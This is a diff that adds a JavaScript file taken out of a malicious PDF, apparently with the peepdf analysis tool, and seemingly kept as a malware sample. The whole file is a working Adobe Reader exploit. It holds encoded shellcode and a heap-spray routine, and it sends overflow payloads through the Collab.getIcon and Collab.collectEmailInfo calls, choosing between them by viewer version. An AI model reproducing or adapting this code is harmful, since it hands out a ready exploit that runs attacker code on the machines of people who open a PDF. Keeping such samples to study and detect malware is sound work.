@@ -1,0 +1,71 @@
+// peepdf comment: Javascript code located in object 17 (version 1)
+
+function none(a, b) {
+    a + b;
+}
+
+function repeat(count, what) {
+    var v = "";
+    while (--count >= 0) v += what;
+    return v;
+}
+
+function myunescape(buf) {
+    var ret = '';
+    for (var x = 0; x < buf.length; x += 2) {
+        ret += util.byteToChar(Number('0x' + buf.substr(x, 2)));
+    }
+    return ret;
+}
+var sc1 = unescape("%u5850%u5850%uEB90%u4022%u5A48%u5F52%u8B66%u800A" + "%u30F9%u1A74%uE980%uC064%u04E1%uED80%u8064%u0FE5" + "%uCD02%u0F88%u4242%uEB47%uE8E3%uFFD9%uFFFF");
+var sc2 = unescape("%u6C72%u6464%u6464%u6464%u6464%u6E69%u6969%u6F6C" + "%u7072%u656C%u7072%u686A%u6864%u6464%u6464%u6F6C" + "%u6873%u6C72%u706C%u6564%u6464%u6464%u6F6C%u6C73" + "%u6C72%u7372%u6464%u6464%u6464%u6D6C%u6A64%u7373" + "%u6A67%u6C6A%u716E%u6F6D%u716B%u7371%u6C72%u6865" + "%u6564%u6464%u6464%u6D6C%u6A68%u7064%u7373%u6A67" + "%u6C6A%u6D66%u6665%u6A70%u6A69%u6C72%u6964%u6564" + "%u6464%u6464%u6D6C%u6A68%u6465%u7373%u6A67%u6C6A" + "%u6D69%u7067%u6B64%u6F6B%u6C72%u6A73%u6464%u6464" + "%u6464%u6D6C%u6A68%u6865%u7373%u6A67%u6C6A%u726B" + "%u6C71%u6672%u676B%u6C72%u6B72%u6464%u6464%u6464" + "%u6D6C%u6A68%u6867%u6767%u6D70%u6F72%u6764%u6F6C" + "%u7268%u7067%u676C%u6570%u6864%u6569%u6E6A%u6464" + "%u6569%u7373%u6A69%u7064%u6D69%u676C%u6C73%u7373" + "%u686B%u6473%u7167%u6468%u7365%u6464%u6464%u6A6B" + "%u6D72%u6D6C%u7268%u7067%u6E6A%u6464%u6E6A%u6464" + "%u6E6A%u6464%u6E6A%u6664%u6E6A%u6464%u7373%u6A6B" + "%u7067%u7373%u6A69%u6465%u6D6C%u6A68%u6868%u676C" + "%u6C73%u6464%u686B%u6F70%u6E6A%u6464%u6E6A%u6464" + "%u6E6A%u6464%u6E6A%u6864%u7373%u6A6B%u6868%u7373" + "%u6A69%u6865%u6D6C%u6A68%u6C68%u676C%u6C73%u6464" + "%u686B%u696F%u656C%u6C67%u6966%u6469%u6868%u6A68" + "%u6F6C%u7268%u7067%u696B%u716E%u656C%u6C6F%u6464" + "%u6665%u6464%u6464%u6469%u686A%u6469%u6868%u696B" + "%u656E%u656C%u6C6F%u6864%u6665%u6464%u6464%u7372" + "%u7273%u6E72%u726E%u696B%u696D%u6D6F%u6464%u6A64" + "%u6464%u6464%u656C%u7072%u6464%u6C64%u6464%u6464" + "%u6A69%u6B69%u6F6C%u6473%u656C%u6A70%u6465%u6665" + "%u6464%u6464%u6F6C%u6870%u676C%u6470%u6C64%u6F6C" + "%u6C73%u6773%u686E%u6D6F%u6464%u6A64%u6464%u6464" + "%u6D68%u6D68%u6D68%u6D68%u656C%u6867%u6C64%u7272" + "%u7273%u7273%u7372%u696C%u6D70%u696B%u6573%u7369" + "%u7269%u7373%u6A6B%u7067%u7373%u6A6B%u6C68%u7373" + "%u6A6B%u6868%u7373%u6472%u6969%u6A69%u686A%u656E" + "%u6467%u6464%u6464%u6464%u696C%u6470%u6C6B%u6765" + "%u7267%u6F6C%u6468%u7064%u7267%u6F6C%u646B%u7065" + "%u7267%u6F6C%u7269%u6C64%u716E%u7267%u6F6C%u6C6A" + "%u6C64%u6F72%u7164%u7267%u6F6C%u6468%u6867%u7267" + "%u6F6C%u6C6E%u6C6F%u6464%u6464%u6464%u6767%u6F71" + "%u6F6C%u6970%u7269%u7169%u6670%u6864%u6464%u6769" + "%u6969%u6A69%u6B69%u6A67%u6F6C%u706A%u6866%u6C65" + "%u6A67%u6F6C%u6968%u7067%u6A67%u6F6C%u6869%u6964" + "%u6C6B%u6764%u6971%u7267%u6F6C%u6E68%u6C65%u7267" + "%u6F6C%u6E69%u6466%u6764%u7171%u6772%u6C67%u6D68" + "%u7267%u6F6C%u6867%u6F6C%u6764%u6973%u6767%u7373" + "%u7073%u6767%u6470%u706E%u6E67%u6870%u686B%u6B64" + "%u6570%u7370%u7164%u6764%u6C73%u6F72%u6673%u6A67" + "%u6F67%u706B%u6866%u6865%u696B%u7371%u7267%u6F6C" + "%u6E69%u6866%u6764%u7171%u6A6A%u7267%u6F6C%u7064" + "%u6F68%u7267%u6F6C%u6E69%u7065%u6764%u7171%u7267" + "%u6F6C%u6864%u6F6C%u6764%u6970%u6F72%u6664%u6767" + "%u6470%u6F6C%u6971%u7369%u7269%u7169%u6F69%u6670" + "%u6C64%u6464%u6C72%u6464%u6464%u6464%u6464%u6C69" + "%u676C%u6470%u6964%u6770%u3030");
+var sc = sc1 + sc2;
+
+function exploit() {
+
+    blah = repeat(128, unescape("%u4647%u4a4b%u4849%u4647%u4849")) + sc;
+    bigblock = unescape("%u4a4b%u4647");
+    headersize = 20;
+    wap = headersize + blah.length;
+    while (bigblock.length < wap) bigblock += bigblock;
+    fillblock = bigblock.substring(0, wap);
+    block = bigblock.substring(0, bigblock.length - wap);
+    while (block.length + wap < 0x40000) block = block + block + fillblock;
+    mm = new Array();
+    for (i = 0; i < 200; i++) mm[i] = block + blah;
+    of = repeat(4096, myunescape("0a0a0a0a"));
+    var a = ["_N.bundle"]; //javascript comment
+    Collab["getIcon"](of + a[0x0]);
+}
+
+function start() {
+    if (app.viewerVersion >= 7.0) {
+        plin = repeat(1124, unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%u4346%u4a4b") + repeat(122, unescape("%u0b0b%u0028%u06eb%u06eb")) + sc + repeat(1256, unescape("%u4a4b%u4748"));
+    } else {
+        ef6 = unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");
+        plin = repeat(80, unescape("%u4141%u4141")) + sc + repeat(80, unescape("%u4241%u4142")) + unescape("%uf7e9%ufff9")
+
+        + unescape("%uffff%uffff") + unescape("%uf6eb%uf4eb") + unescape("%uf2eb%uf1eb");
+        while ((plin.length % 8) != 0)
+        plin = unescape("%u4141") + plin;
+
+        plin += repeat(2626, ef6);
+    }
+    if (app.viewerVersion >= 6.0) {
+        var a = []; //javascript for adobe
+        Collab["collectEmailInfo"]({
+            subj: a[0x0],
+            msg: plin
+        });
+    }
+}
+
+
+if (app.viewerVersion >= 8.0) {
+    var inBrowser = this.external;
+    if (inBrowser) var shaft = app.setTimeOut("exploit()", 1200);
+    else exploit();
+} else {
+    var shaft = app.setTimeOut("start()", 1200);
+}
+
